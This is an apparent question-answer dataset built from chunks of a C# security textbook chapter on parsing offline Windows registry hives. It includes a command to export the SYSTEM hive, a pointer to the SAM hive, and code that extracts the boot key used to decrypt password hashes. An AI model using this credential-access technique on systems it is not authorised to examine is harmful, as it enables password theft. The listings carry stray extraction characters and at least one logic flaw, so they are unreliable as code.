Hello World application,\nwe saw one difference between the code that results from a decompiled\nassembly and that of the original source. Other differences may occur, such\nas the keyword var being replaced with the actual type of the object being\ncreated. However, the generated code should still be functionally equiva-\nlent, even if it isn’t completely the same source code as before.\nThen, we used the monodis tool to see how to dissect and analyze assem-\nblies to glean more information from a rogue application than we would\neasily have been able to do otherwise. Hopefully, these tools can decrease\nthe time between going from “What happened?” to “How do we fix it?”\nwhen something goes wrong or a new piece of malware is found.\nDecompiling and Reversing Managed Assemblies 247",
    "question": "What is the key concept discussed in the text that explains how to automate Metasploit and Arachni for penetration testing and vulnerability scanning?",
    "summary": "This chapter explains how to automate Metasploit and Arachni using their RPC and REST interfaces. For Metasploit, we created a C# class to interact with the RPC server, allowing us to exploit Metasploitable 2 and run commands on the compromised system. For Arachni, we developed a C# tool that uses its REST API to scan websites for vulnerabilities, and later implemented an RPC-based solution for more advanced automation. The chapter also covers how to decompile .NET and Mono assemblies using open-source libraries like Mono.Cecil and the monodis tool, which helps in analyzing malicious binaries for potential backdoors or other issues."
  },
  {
    "start": 179,
    "end": 182,
    "text": "14\nre aDinG offline\nreGiStry HiVeS\nThe Windows NT registry is a gold mine of\ninformation for useful data such as patch\nlevels and password hashes. And that infor-\nmation isn’t just useful for offensive pentesters\nlooking to exploit a network; it’s also useful for any-\none in the incident response or data forensics area of\ninformation security.\nSay, for example, you’re handed the hard drive of a computer that\nhas been breached and you need to find out what happened. What do you\ndo? Being able to read key information from the hard drive regardless of\nwhether Windows can run is imperative. The Windows registry is actually\na collection of files on the disk, called registry hives, and learning your way\naround the registry hives will allow you to better use these hives that hold\nso much useful information. Registry hives are also a great introduction to\nparsing binary file formats, which are made to store data efficiently for com-\nputers but are not so great for human consumption.\nIn this chapter, we discuss the Windows NT registry hive data structure,\nand we write a small library with a few classes to read offline hives from\nwhich we can extract useful information, such as the boot key. This is use-\nful if you want to extract password hashes from the registry later.\nthe registry Hive Structure\nAt a high level, the registry hive is a tree\nRegistry Header\nof nodes. Each node may have key/value\npairs, and it may have child nodes. We’ll\nuse the terms node key and value key to clas- root\nsify the two types of data in the registry\nhive and create classes for both key types.\nNode keys contain information about\nFoo Bar\nthe structure of the tree and its subkeys,\nBaz: true\nwhereas value keys hold value informa- Bat: \"AHA\"\ntion that applications access. Visually,\nthe tree looks a bit like Figure 14-1.\nBarBuzz\nEvery node key has some specific\nmetadata stored alongside it, such as the\nlast time its value keys were modified\nand other system-level information. All Figure 14-1: A visual representation\nof this data is stored very efficiently for a of a simple registry tree with nodes,\ncomputer to read—but not for a human. keys, and values\nWhile we implement our library, we’ll\nskip over some of this metadata in order\nto make the end result simpler, but I will\ncall these instances out as we go.\nAs you can see in Figure 14-1, after the registry header, the node tree\nbegins with the root node key. The root node key has two child nodes, which\nin this example we call Foo and Bar. The Foo node key contains two value keys,\nBaz and Bat, which have values of true and \"AHA\", respectively. Bar, on the\nother hand, only has child node BarBuzz, which has a single value key. This\nexample of a registry hive tree is very contrived and simple. The registry\nhives on your machine are more complex and likely have millions of keys!\nGetting the registry Hives\nDuring normal operation, Windows locks the registry hives to prevent\ntampering. Altering the Windows registry can have potentially devastat-\ning results, such as an unbootable computer, so it’s not something to take\nlightly. You can, however, use cmd.exe to export a given registry hive if you\nhave Administrator access to the machine. Windows ships with reg.exe,\nwhich is a useful command line utility for reading and writing to the regis-\ntry. We can use this tool to copy the hives that we’re interested in so that we\ncan read them offline, as shown in Listing 14-1. This will prevent any acci-\ndental catastrophes.\n250 Chapter 14\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32>reg usave HKLM\\System C:\\system.hive\nThe operation completed successfully.\nListing 14-1: Using reg.exe to copy a registry hive\nUsing the save subcommand u, we specify the registry path we want to\nsave as well as the file to save to. The first argument is the HKLM\\System path,\nwhich is the root registry node for the system registry hive (where informa-\ntion such as the boot key resides). By choosing this registry path, we save a\ncopy of the system’s registry hive off the machine for further analysis later.\nThis same technique can be used for HKLM\\Sam (where usernames and hashes\nare stored) and HKLM\\Software (where patch levels and other software infor-\nmation are stored). But remember, saving these nodes requires administra-\ntor access!\nThere’s also another method for getting the registry hives if you have\na hard drive you can mount on your machine. You can simply copy the\nregistry hives from the System32 folder where the raw hives are stored by the\noperating system. If Windows isn’t running, the hives won’t be locked, and\nyou should be able to copy them to another system. You can find the raw\nhives currently in use by the operating system in the directory C:\\Windows\\\nSystem32\\config (see Listing 14-2).\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32>cd config\nC:\\Windows\\System32\\config>dir\nVolume in drive C is BOOTCAMP\nVolume Serial Number is B299-CCD5\nDirectory of C:\\Windows\\System32\\config\n01/24/2016 02:17 PM <DIR> .\n01/24/2016 02:17 PM <DIR> ..\n05/23/2014 03:19 AM 28,672 BCD-Template\n01/24/2016 02:24 PM 60,555,264 COMPONENTS\n01/24/2016 02:24 PM 4,456,448 DEFAULT\n07/13/2009 08:34 PM <DIR> Journal\n09/21/2015 05:56 PM 42,909,696 prl_boot\n01/19/2016 12:17 AM <DIR> RegBack\n01/24/2016 02:13 PM 262,144 SAM\n01/24/2016 02:24 PM 262,144 SECURITY u\n01/24/2016 02:36 PM 115,867,648 SOFTWARE v\n01/24/2016 02:33 PM 15,728,640 SYSTEM w\n06/22/2014 06:13 PM <DIR> systemprofile\n05/24/2014 10:45 AM <DIR> TxR\n8 File(s) 240,070,656 bytes\n6 Dir(s) 332,737,015,808 bytes free\nC:\\Windows\\System32\\config>\nListing 14-2: The contents of the C:\\Windows\\System32\\config folder with registry hives\nReading Offline Registry Hives 251\nListing 14-2 shows the registry hives in the directory. The SECURITY u,\nSOFTWARE v, and SYSTEM w hives are the ones with the most commonly sought\ninformation. Once hives are copied onto your system, you can easily verify\nthat you have saved the registry hives you want to read with the file com-\nmand if you are using Linux or OS X, as shown in Listing 14-3.\n$ file system.hive\nsystem.hive: MS Windows registry file, NT/2000 or above\n$\nListing 14-3: Confirming which registry hive you saved in Linux or OS X\nNow we’re ready to start digging into a hive.\nreading the registry Hive\nWe’ll start by reading the registry hive header, a 4,096-byte chunk of data at\nthe beginning of the registry hive. Don’t worry, only the first 20 bytes or so\nare actually useful for parsing, and we’ll only read the first four to verify the\nfile is a registry hive. The remaining 4,000+ bytes are just buffer.\nCreating a Class to Parse a Registry Hive File\nWe’ll create a new class to begin parsing the file: the RegistryHive class. This\nis one of the simpler classes we’ll implement in order to read offline registry\nhives. It has only a constructor and a few properties, as shown in Listing 14-4.\npublic class RegistryHive\n{\npublic uRegistryHive(string file)\n{\nif (!vFile.Exists(file))\nthrow new FileNotFoundException();\nthis.Filepath = file;\nusing (FileStream stream = wFile.OpenRead(file))\n{\nusing (BinaryReader reader = new xBinaryReader(stream))\n{\nbyte[] buf = reader.ReadBytes(4);\nif y(buf[0] != 'r' || buf[1] != 'e' || buf[2] != 'g' || buf[3] != 'f')\nthrow new NotSupportedException(\"File not a registry hive.\");\n//fast-forward\nzreader.BaseStream.Position = 4096 + 32 + 4;\nthis.RootKey = new {NodeKey(reader);\n}\n}\n}\n252 Chapter 14\npublic string Filepath { get; set; }\npublic NodeKey RootKey { get; set; }\npublic bool WasExported { get; set; }\n}\nListing 14-4: The RegistryHive class\nLet’s look at the constructor where the magic first happens. The con-\nstructor u accepts a single argument, which is the file path to the offline\nregistry hive on the filesystem. We check whether the path exists using\nFile.Exists() v, and we throw an exception if it doesn’t.\nOnce we have determined the file exists, we need to make sure it is\na registry file. But this is not hard. The first four magic bytes of any reg-\nistry hive should be r, e, g, and f. To check whether our file matches, we\nopen a stream to read the file using File.OpenRead() w. Then we create a new\nBinaryReader x by passing the file stream to the BinaryReader constructor. We\nuse this to read the first four bytes of the file and store them in a byte array.\nThen, we check whether they match y. If they don’t, we throw an exception:\nthe hive is either too damaged to be read normally or is not a hive at all!\nIf the header checks out, though, we fast-forward z to the end of the\nregistry header block to the root node key (skipping some metadata we\ndon’t need at the moment). In the next section, we create a NodeKey class to\nhandle our node keys so we can read the key by passing the BinaryReader to a\nNodeKey constructor {, and we assign the new NodeKey to the RootKey property\nfor later use.\nCreating a Class for Node Keys\nThe NodeKey class is the most complex class we need to implement to read\nthe offline registry hive. There is a bit of metadata stored in the registry\nhive for node keys that we can skip, but there’s a lot that we can’t. However,\nthe constructor for the NodeKey class is quite simple, though it has quite a few\nproperties, as Listing 14-5 shows.\npublic class NodeKey\n{\npublic uNodeKey(BinaryReader hive)\n{\nReadNodeStructure(hive);\nReadChildrenNodes(hive);\nReadChildValues(hive);\n}\npublic List<NodeKey> vChildNodes { get; set; }\npublic List<ValueKey> wChildValues { get; set; }\npublic DateTime xTimestamp { get; set; }\npublic int ParentOffset { get; set; }\npublic int SubkeysCount { get; set; }\npublic int LFRecordOffset { get; set; }\npublic int ClassnameOffset { get; set; }\npublic int SecurityKeyOffset { get; set; }\nReading Offline Registry Hives 253\npublic int ValuesCount { get; set; }\npublic int ValueListOffset { get; set; }\npublic short NameLength { get; set; }\npublic bool IsRootKey { get; set; }\npublic short ClassnameLength { get; set; }\npublic string Name { get; set; }\npublic byte[] ClassnameData { get; set; }\npublic NodeKey ParentNodeKey { get; set; }\nListing 14-5: The NodeKey class constructor and properties\nThe NodeKey class constructor u takes a single argument, which is a\nBinaryReader for the registry hive. The constructor calls three methods\nthat read and parse specific parts of the node, which we’ll implement\nnext. After the constructor, we define several properties that will be used\nthroughout the next three methods. The first three properties are particu-\nlarly useful: ChildNodes v, ChildValues w, and Timestamp x.\nThe first method called in the NodeKey constructor is ReadNodeStructure(),\nwhich reads the node key data from the registry hive but not any of its child\nnodes or values. This is detailed in Listing 14-6.\nprivate void ReadNodeStructure(BinaryReader hive)\n{\nbyte[] buf = hive.uReadBytes(4);\nif (buf[0] != 0x6e || buf[1] != 0x6b) //nk\nthrow new NotSupportedException(\"Bad nk header\");\nlong startingOffset = vhive.BaseStream.Position;\nthis.wIsRootKey = (buf[2] == 0x2c) ? true : false;\nthis.xTimestamp = DateTime.FromFileTime(hive.ReadInt64());\nhive.BaseStream.Position += y4; //skip metadata\nthis.ParentOffset = hive.zReadInt32();\nthis.SubkeysCount = hive.ReadInt32();\nhive.BaseStream.Position += 4; //skip metadata\nthis.LFRecordOffset = hive.ReadInt32();\nhive.BaseStream.Position += 4; //skip metadata\nthis.ValuesCount = hive.ReadInt32();\nthis.ValueListOffset = hive.ReadInt32();\nthis.SecurityKeyOffset = hive.ReadInt32();\nthis.ClassnameOffset = hive.ReadInt32();\nhive.BaseStream.Position = startingOffset + 68;\nthis.NameLength = hive.{ReadInt16();\nthis.ClassnameLength = hive.ReadInt16();\nbuf = hive.|ReadBytes(this.NameLength);\nthis.Name = System.Text.Encoding.UTF8.GetString(buf);\n254 Chapter 14\nhive.BaseStream.Position = this.ClassnameOffset + 4 + 4096;\nthis.}ClassnameData = hive.ReadBytes(this.ClassnameLength);\n}\nListing 14-6: The ReadNodeStructure() method of the NodeKey class\nTo begin the ReadNodeStructure() method, we read the next four bytes\nof the node key with ReadBytes() u to check that we are at the beginning of\na node key (note that the second two bytes are junk that we can ignore for\nour purposes; we only care about the first two bytes). We compare the first\ntwo of these bytes to 0x6e and 0x6b, respectively. We are looking for the two\nhexadecimal byte values that represent the ASCII characters n and k (for\nnode key). Every node key in the registry hive starts with these two bytes, so\nwe can always be sure that we are parsing what we expect. After determin-\ning we are reading a node key, we save our current position v in the file\nstream so that we can easily return to it.\nNext, we begin assigning values to some of the NodeKey properties, start-\ning with the IsRootKey w and Timestamp x properties. Notice that every few\nlines, we skip ahead by four in the current stream position y without read-\ning anything. We’re skipping pieces of metadata that aren’t necessary for\nour purposes.\nThen, we use the ReadInt32() method z to read four bytes and return\nan integer representing them that C# can read. This is what makes the\nBinaryReader class so useful. It has many convenient methods that will cast\nbytes for you. As you can see, most of the time, we will use the ReadInt32()\nmethod, but occasionally we will use ReadInt16() { or other methods to read\nspecific types of integers, such as unsigned and really long integers.\nFinally, we read the name of the NodeKey | and assign the string to the\nName property. We also read the class name data }, which we will use later\nwhen dumping the boot key.\nNow we need to implement the ReadChildrenNodes() method. This\nmethod iterates over each child node and adds the node to the ChildNodes\nproperty so that we can analyze it later, as Listing 14-7 shows.\nprivate void ReadChildrenNodes(uBinaryReader hive)\n{\nthis.ChildNodes = new vList<NodeKey>();\nif (this.LFRecordOffset != -1)\n{\nhive.BaseStream.Position = 4096 + this.LFRecordOffset + 4;\nbyte[] buf = hive.ReadBytes(2);\n//ri\nif w(buf[0] == 0x72 && buf[1] == 0x69)\n{\nint count = hive.ReadInt16();\nxfor (int i = 0; i < count; i++)\n{\nlong pos = hive.BaseStream.Position;\nint offset = hive.ReadInt32();\nReading Offline Registry Hives 255\nyhive.BaseStream.Position = 4096 + offset + 4;\nbuf = hive.ReadBytes(2);\nif (!(buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68)))\nthrow new Exception(\"Bad LF/LH record at:\"\n+ hive.BaseStream.Position);\nzParseChildNodes(hive);\n{hive.BaseStream.Position = pos + 4; //go to next record list\n}\n}\n//lf or lh\nelse if |(buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68))\n}ParseChildNodes(hive);\nelse\nthrow new Exception(\"Bad LF/LH/RI record at: \"\n+ hive.BaseStream.Position);\n}\n}\nListing 14-7: The ReadChildrenNodes() method of the NodeKey class\nLike most of the methods we will be implementing for the NodeKey\nclass, the ReadChildrenNodes() method takes a single argument, which is the\nBinaryReader u for the registry hive. We create an empty list v of node keys\nfor the ChildNodes property to read to. Then we must parse any child nodes\nin the current node key. This gets a bit tricky because there are three differ-\nent ways to point to child node keys, and one type is read differently than\nthe other two. The three types are the ri (for index root), lf (for fast leaf),\nand lh (for hash leaf) structures.\nWe check whether we are on an ri structure w first. The ri structure is\na container and is stored slightly differently. It is used for pointing to mul-\ntiple lf or lh records and allows a node key to have more child nodes than a\nsingle lf or lh record can handle. As we loop over each set of child nodes in\na for loop x, we jump to each child record y and call ParseChildNodes() z,\nwhich we will implement next, by passing the BinaryReader for the hive as the\nonly argument. After parsing the child nodes, we can see that our stream\nposition has changed (we’ve moved around in the registry hive), so we set\nthe stream position back to the ri list {, where we were before reading the\nchildren, in order to read the next record in the list.\nIf we are dealing with an lf or lh record |, we just pass the BinaryReader\nto the ParseChildNodes() method } and let it read the nodes directly.\nLuckily, once the child nodes have been read, they can all be parsed in\nthe same way, regardless of the structure used to point to them. The method\nto do all of the actual parsing is relatively easy, as shown in Listing 14-8.\nprivate void ParseChildNodes(uBinaryReader hive)\n{\nint count = hive.vReadInt16();\nlong topOfList = hive.BaseStream.Position;\n256 Chapter 14\nwfor (int i = 0; i < count; i++)\n{\nhive.BaseStream.Position = topOfList + (i*8);\nint newoffset = hive.ReadInt32();\nhive.BaseStream.Position += 4; //skip over registry metadata\nhive.BaseStream.Position = 4096 + newoffset + 4;\nNodeKey nk = new xNodeKey(hive) { ParentNodeKey = this };\nthis.ChildNodes.yAdd(nk);\n}\nhive.BaseStream.Position = topOfList + (count * 8);\n}\nListing 14-8: The ParseChildNodes() method for the NodeKey class\nParseChildNodes() takes a single argument, the BinaryReader u for the\nhive. The number of nodes we need to iterate over and parse is stored in a\n16-bit integer, which we read from the hive v. After storing our position so\nwe can return to it later, we begin iterating in a for loop w, jumping to each\nnew node and passing the BinaryReader to the NodeKey class constructor x.\nOnce the child NodeKey is created, we add y the node to the ChildNodes list\nand begin the process again, until no more nodes are available to be read.\nThe last method, called in the NodeKey constructor, is the ReadChildValues()\nmethod. This method call, detailed in Listing 14-9, populates the ChildValues\nproperty list with all the key/value pairs we have found in the node key.\nprivate void ReadChildValues(BinaryReader hive)\n{\nthis.ChildValues = new uList<ValueKey>();\nif (this.ValueListOffset != v-1)\n{\nwhive.BaseStream.Position = 4096 + this.ValueListOffset + 4;\nfor (int i = 0; i < this.ValuesCount; i++)\n{\nhive.BaseStream.Position = 4096 + this.ValueListOffset + 4 + (i*4);\nint offset = hive.ReadInt32();\nhive.BaseStream.Position = 4096 + offset + 4;\nthis.ChildValues.xAdd(new ValueKey(hive));\n}\n}\n}\nListing 14-9: The ReadChildValues() method for the NodeKey class\nWithin the ReadChildValues() method, we first instantiate a new list u\nto store the ValueKeys in and assign it to the ChildValues property. If the\nValueListOffset doesn’t equal -1 v (which is a magic value that means there\nare no child values), we jump to the ValueKey list w and begin reading each\nvalue key in a for loop, adding x each new key to the ChildValues property\nso we can access it later.\nWith this step, the NodeKey class is complete. The last class to implement\nis the ValueKey class.\nReading Offline Registry Hives 257",
    "question": "What is the significance of the Windows NT registry hives in the context of incident response and data forensics?",
    "summary": "The Windows NT registry contains valuable data like patch levels and password hashes, which is useful for both offensive pentesting and incident response. Registry hives are efficient binary files that can be read offline to extract this information. This chapter explains how to create a library to read and parse registry hives, including classes for node keys and value keys, allowing for the analysis of registry data without needing Windows to be running."
  },
  {
    "start": 183,
    "end": 188,
    "text": "Making a Class to Store Value Keys\nThe ValueKey class is much simpler and shorter than the NodeKey class. Most\nof the ValueKey class is just the constructor, as Listing 14-10 shows, though\nthere are a handful of properties as well. This is all that is left to implement\nbefore we can start reading the offline registry hive.\npublic class ValueKey\n{\npublic uValueKey(BinaryReader hive)\n{\nbyte[] buf = hive.vReadBytes(2);\nif (buf[0] != 0x76 || buf[1] != 0x6b) //vk\nthrow new NotSupportedException(\"Bad vk header\");\nthis.NameLength = hive.wReadInt16();\nthis.DataLength = hive.xReadInt32();\nbyte[] ydatabuf = hive.ReadBytes(4);\nthis.ValueType = hive.ReadInt32();\nhive.BaseStream.Position += 4; //skip metadata\nbuf = hive.ReadBytes(this.NameLength);\nthis.Name = (this.NameLength == 0) ? \"Default\" :\nSystem.Text.Encoding.UTF8.GetString(buf);\nif (zthis.DataLength < 5)\n{this.Data = databuf;\nelse\n{\nhive.BaseStream.Position = 4096 + BitConverter.|ToInt32(databuf, 0) + 4;\nthis.Data = hive.ReadBytes(this.DataLength);\n}\n}\npublic short NameLength { get; set; }\npublic int DataLength { get; set; }\npublic int DataOffset { get; set; }\npublic int ValueType { get; set; }\npublic string Name { get; set; }\npublic byte[] Data { get; set; }\npublic string String { get; set; }\n}\nListing 14-10: The ValueKey class\nIn the constructor u, we read v the first two bytes and make sure\nthat we are reading a value key by comparing the two bytes to 0x76 and 0x6b,\nas we did earlier. In this case, we are looking for vk in ASCII. We also read\nthe lengths of the name w and data x and assign those values to their\nrespective properties.\n258 Chapter 14\nSomething to note is that the databuf variable y can hold either\na pointer to the value key data or the value key data itself. If the data\nlength is five or more, the data is generally in a four-byte pointer. We use\nthe DataLength property z to check whether the ValueKey length is less than\nfive. If so, we assign the data in the databuf variable directly to the Data prop-\nerty { and finish up. Otherwise, we turn the databuf variable into a 32-bit\ninteger |, which is an offset from the current position in the file stream to\nthe actual data to read, and then jump to that position in the stream and\nread the data with ReadBytes(), assigning it to the Data property.\ntesting the Library\nOnce we’ve finished writing the classes, we can write a quick Main() method,\nshown in Listing 14-11, to test that we are successfully parsing the registry hive.\npublic static void Main(string[] args)\n{\nRegistryHive hive = new uRegistryHive(args[0]);\nConsole.WriteLine(\"The rootkey's name is \" + hive.RootKey.Name);\n}\nListing 14-11: The Main() method to print the root key name of a registry hive\nIn the Main() method, we instantiate a new RegistryHive class u by pass-\ning the first argument of the program as the file path to the offline registry\nhive on the filesystem. Then, we print the name of the registry hive root\nNodeKey, which is stored in the RegistryHive class RootKey property:\n$ ./ch14_reading_offline_hives.exe /Users/bperry/system.hive\nThe rootkey's name is CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\n$\nOnce we have confirmed that we are successfully parsing the hive, we\nare ready to search the registry for the information we’re interested in.\ndumping the Boot key\nUsernames are nice, but password hashes are probably a lot more useful.\nTherefore, we’ll look at how to find these now. In order to access the pass-\nword hashes in the registry, we must first retrieve the boot key from the SYSTEM\nhive. The password hashes in the Windows registry are encrypted with the\nboot key, which is unique to most Windows machines (unless they are images\nor virtual machine clones). Adding four more methods to the class with our\nMain() method will allow us to dump the boot key from a SYSTEM registry hive.\nThe GetBootKey() Method\nThe first method is the GetBootKey() method, which takes a registry hive and\nreturns an array of bytes. The boot key is broken up across multiple node\nReading Offline Registry Hives 259\nkeys in the registry hive, which we must first read and then decode using a\nspecial algorithm that will give us the final boot key. The beginning of this\nmethod is shown in Listing 14-12.\nstatic byte[] GetBootKey(RegistryHive hive)\n{\nValueKey controlSet = uGetValueKey(hive, \"Select\\\\Default\");\nint cs = BitConverter.ToInt32(controlSet.Data, 0);\nStringBuilder scrambledKey = new StringBuilder();\nforeach (string key in new string[] v{\"JD\", \"Skew1\", \"GBG\", \"Data\"})\n{\nNodeKey nk = wGetNodeKey(hive, \"ControlSet00\" + cs +\n\"\\\\Control\\\\Lsa\\\\\" + key);\nfor (int i = 0; i < nk.ClassnameLength && i < 8; i++)\nscrambledKey.xAppend((char)nk.ClassnameData [i*2]);\n}\nListing 14-12: Beginning of the GetBootKey() method to read the scrambled boot key\nThe GetBootKey() method starts by grabbing the \\Select\\Default value\nkey with the GetValueKey() method u (which we’ll implement shortly). It\nholds the current control set being used by the registry. We need this so\nthat we read the correct boot key registry values from the correct control\nset. Control sets are sets of operating system configurations kept in the reg-\nistry. Copies are kept for backup purposes in case the registry is corrupted,\nso we want to pick the control set that is selected by default at boot, which is\ndictated by the \\Select\\Default registry value key.\nOnce we’ve found the correct default control set, we iterate over the\nfour value keys—JD, Skew1, GBG, and Data—that contain the encoded boot\nkey data v. As we iterate, we find each key with GetNodeKey() w (which we’ll\nalso implement shortly), iterate over the boot key data byte by byte, and\nappend x it to the total scrambled boot key.\nOnce we have the scrambled boot key, we need to descramble it, and we\ncan use a straightforward algorithm. Listing 14-13 shows how we can turn\nour scrambled boot key into the key used to decrypt the password hashes.\nbyte[] skey = uStringToByteArray(scrambledKey.ToString());\nbyte[] descramble = vnew byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,\n0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };\nbyte[] bootkey = new wbyte[16];\nxfor (int i = 0; i < bootkey.Length; i++)\nbootkey[i] = skey[ydescramble[i]];\nreturn zbootkey;\n}\nListing 14-13: Finishing the GetBootKey() method to descramble the boot key\n260 Chapter 14\nAfter converting the scrambled key into a byte array for further pro-\ncessing with StringToByteArray() u, which we’ll implement soon, we create a\nnew byte array v to descramble our current value. We then create another\nnew byte array w to store the final product and begin iterating over the\nscrambled key in a for loop x, using the descramble byte array y to find the\ncorrect values for the final bootkey byte array. The final key is then returned\nto the caller z.\nThe GetValueKey() Method\nThe GetValueKey() method, shown in Listing 14-14, simply returns a value for\na given path in the hive.\nstatic ValueKey GetValueKey(uRegistryHive hive, vstring path)\n{\nstring keyname = path.wSplit('\\\\').xLast();\nNodeKey node = yGetNodeKey(hive, path);\nreturn node.ChildValues.zSingleOrDefault(v => v.Name == keyname);\n}\nListing 14-14: The GetValueKey() method\nThis simple method accepts a registry hive u and the registry path v\nto find in the hive. Using the backslash character to separate the nodes\nin the registry path, we split w the path and take the last segment x of\nthe path as the value key to find. We then pass the registry hive and registry\npath to GetNodeKey() y (implemented next), which will return the node that\ncontains the key. Finally, we use the LINQ method SingleOrDefault() z to\nreturn the value key from the node’s child values.\nThe GetNodeKey() Method\nThe GetNodeKey() method is a bit more complicated than the GetValueKey()\nmethod. Shown in Listing 14-15, the GetNodeKey() method iterates through\na hive until it finds a given node key path and returns the node key.\nstatic NodeKey GetNodeKey(uRegistryHive hive, vstring path)\n{\nNodeKey wnode = null;\nstring[] paths = path.xSplit('\\\\');\nforeach (string ch in ypaths)\n{\nif (node == null)\nnode = hive.RootKey;\nzforeach (NodeKey child in node.ChildNodes)\n{\nif (child.Name == ch)\n{\nnode = child;\nbreak;\nReading Offline Registry Hives 261\n}\n}\nthrow new Exception(\"No child found with name: \" + ch);\n}\n{return node;\n}\nListing 14-15: The GetNodeKey() method\nThe GetNodeKey() method accepts two arguments—the registry hive u\nto search and the path of the node v to return—separated by backslash\ncharacters. We start by declaring a null node w for keeping track of our\nposition while traversing the registry tree paths; then we split x the path at\neach backslash character, returning an array of path segment strings. We\nthen iterate over each path segment, traversing the registry tree until we\nfind the node at the end of the path. We start traversing using a foreach loop\nthat will progressively loop over each path segment in the paths array y. As\nwe iterate over each segment, we use a foreach loop z inside the for loop to\nfind the next segment in the path until we have found the last node. Finally,\nwe return { the node we found.\nThe StringToByteArray() Method\nFinally, we implement the StringToByteArray() method used in Listing 14-13.\nThis very simple method is detailed in Listing 14-16.\nstatic byte[] StringToByteArray(string s)\n{\nreturn uEnumerable.Range(0, s.Length)\n.vWhere(x => x % 2 == 0)\n.wSelect(x => Convert.ToByte(s.Substring(x, 2), 16))\n.ToArray();\n}\nListing 14-16: The StringToByteArray() method used by GetBootKey()\nThe StringToByteArray() method uses LINQ to convert each two-\ncharacter string into a single byte. For example, if the string \"FAAF\" were\npassed in, a byte array of { 0xFA, 0xAF } would be returned by the method.\nUsing Enumerable.Range() u to iterate over each character in the string, we\nskip the odd-numbered characters with Where() v and then use Select() w\nto convert each pair of characters into the byte the pair represents.\nGetting the Boot Key\nWe can finally try dumping the boot key from the system hive. By calling our\nnew GetBootKey() method, we can rewrite the Main() method we used previ-\nously to print the root key name to print the boot key instead. Listing 14-17\nshows this.\n262 Chapter 14\npublic static void Main(string[] args)\n{\nRegistryHive systemHive = new uRegistryHive(args[0]);\nbyte[] bootKey = vGetBootKey(systemHive);\nwConsole.WriteLine(\"Boot key: \" + BitConverter.ToString(bootKey));\n}\nListing 14-17: The Main() method testing the GetBootKey() method\nThis Main() method will open the registry hive u, which is passed as\nthe only argument to the program. Then the new hive is passed to the\nGetBootKey() method v. With the new boot key saved, we print the boot key\nwith Console.WriteLine() w.\nThen, we can run the test code to print the boot key, shown in\nListing 14-18.\n$ ./ch14_reading_offline_hives.exe ~/system.hive\nBoot key: F8-C7-0D-21-3E-9D-E8-98-01-45-63-01-E4-F1-B4-1E\n$\nListing 14-18: Running the final Main() method\nIt worked! But how can we be sure this is the actual boot key?\nVerifying the Boot Key\nWe can verify that our code is working correctly by comparing it to the\nresult of bkhive, a popular tool used to dump the boot key of a system\nhive, just as we have done. Included in the repository of code for this book\n(linked from the book’s page at https://www.nostarch.com/grayhatcsharp/) is a\ncopy of the source code for the bkhive tool. Compiling and running this tool\non the same registry hive we have been testing on should verify our results,\nas Listing 14-19 shows.\n$ cd bkhive-1.1.1\n$ make\n$ ./bkhive ~/system.hive /dev/null\nbkhive 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\nDefault ControlSet: 001\nBootkey: uf8c70d213e9de89801456301e4f1b41e\n$\nListing 14-19: Verifying that the boot key returned by our code is what bkhive prints\nReading Offline Registry Hives 263\nThe bkhive tool verifies that our own boot key dumper works like a\ncharm! Although bkhive prints the boot key u in a slightly different form\nthan we do (all lowercase with no hyphens), the data it prints is still the\nsame (F8C70D21…) as ours.\nYou might wonder why go through all the effort with the C# classes to\ndump the boot key when we could just use bkhive. The bkhive tool is highly\nspecialized and will read a specific part of the registry hive, but the classes\nwe implemented can be used to read any part of the registry hive, such as\nthe password hashes (which are encrypted with the boot key!) and patch-\nlevel information. Our classes are much more flexible than the bkhive tool,\nand you’ll be able to use them as starting points if you want to expand your\napplication.\nConclusion\nThe obvious next step for an offensive or incident response–focused regis-\ntry library is to dump the actual usernames and password hashes. Getting\nthe boot key is the most difficult part of this, but it’s also the only step that\nrequires the SYSTEM registry hive. Dumping the usernames and password\nhashes requires the SAM registry hive instead.\nReading registry hives (and other binary file formats in general) is an\nimportant C# skill to develop. Incident response and offensive security\nprofessionals often must be able to implement code that reads and parses\nbinary data in a variety of formats, either over the wire or on disk. In this\nchapter, you first learned how to export the registry hives so that we could\ncopy them to other machines and read them offline. We then implemented\nclasses to read the registry hives using BinaryReader. With these classes built,\nwe were able to read the offline hive and print the root key name. Then, we\ntook it a step further and dumped the boot key, used to encrypt the pass-\nword hashes stored in the Windows registry, from the system hive.\n264 Chapter 14",
    "question": "What is the process for extracting the boot key from a Windows SYSTEM registry hive using the ValueKey and NodeKey classes in C#?",
    "summary": "The ValueKey class is simpler than NodeKey and is used to store value keys from a registry hive. It reads the header, name and data lengths, and the actual data from the hive. The GetBootKey method retrieves and deciphers the boot key from the SYSTEM hive, which is needed to decrypt password hashes. After implementing the necessary methods, the Main() method can be used to test and print the boot key, confirming its correctness by comparing it with the output of the bkhive tool."
  },
  {
    "start": 189,
    "end": 189,
